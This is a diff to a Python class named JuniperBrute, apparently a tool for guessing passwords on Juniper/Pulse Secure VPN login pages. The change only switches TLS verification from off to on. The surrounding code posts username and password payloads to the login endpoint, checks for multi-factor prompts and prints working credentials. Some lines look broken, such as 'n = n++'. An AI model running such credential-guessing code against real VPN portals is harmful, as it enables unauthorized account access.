@@ -12,7 +12,7 @@ class JuniperBrute():
 #        print("[-] Checking for other logon pages...")
 #        for n in [1, 100, 1]:
 #            URL = 'url_' + n
-#            u = c.get(config["protocol"] + '://' + config["HOST"] + ':' + config["port"] + '/dana-na/auth/' + URL + 'welcome.cgi', allow_redirects=False, verify=False)
+#            u = c.get(config["protocol"] + '://' + config["HOST"] + ':' + config["port"] + '/dana-na/auth/' + URL + 'welcome.cgi', allow_redirects=False, verify=True)
 #            if '302' in u:
 #                n = n++
 #            else:
@@ -23,7 +23,7 @@ class JuniperBrute():
 #                    break
     def MFACheck(c, URL):
         print("[-] Checking to see if MultiFactor Authentication is required...")
-        mfa = c.get(config["protocol"] + '://' + config["HOST"] + ':' + config["port"] + '/dana-na/auth/' + URL + 'welcome.cgi', allow_redirects=False, verify=False)
+        mfa = c.get(config["protocol"] + '://' + config["HOST"] + ':' + config["port"] + '/dana-na/auth/' + URL + 'welcome.cgi', allow_redirects=False, verify=True)
         m = re.findall('<input id=(.*?)>', mfa.text, re.DOTALL)
         n = re.search('password2', m)
         if n:
@@ -32,7 +32,7 @@ class JuniperBrute():
             return False
     def connectTest(self, config, payload):
         with session() as c:
-            cget = c.get(config["protocol"] + '://' + config["HOST"] + ':' + config["port"] + '/dana-na/auth/', data=payload, allow_redirects=True, verify=False)
+            cget = c.get(config["protocol"] + '://' + config["HOST"] + ':' + config["port"] + '/dana-na/auth/', data=payload, allow_redirects=True, verify=True)
             if cget.cookies:
                 URL = cget.cookies['DSSIGNIN']
             else:
@@ -42,7 +42,7 @@ class JuniperBrute():
             #if MFACheck() returns TRUE, run urlCheck()
             #if MFAused:
             #    urlCheck()
-            cpost = c.post(config["protocol"] + '://' + config["HOST"] + ':' + config["port"] + '/dana-na/auth/' + URL + 'login.cgi', data=payload, allow_redirects=False, verify=False)
+            cpost = c.post(config["protocol"] + '://' + config["HOST"] + ':' + config["port"] + '/dana-na/auth/' + URL + 'login.cgi', data=payload, allow_redirects=False, verify=True)
             m = re.search('p=user-confirm', str(cpost.headers))
             if m:
                 print("[+]  User Credentials Successful: " + config["USERNAME"] + ":" + config["PASSWORD"])
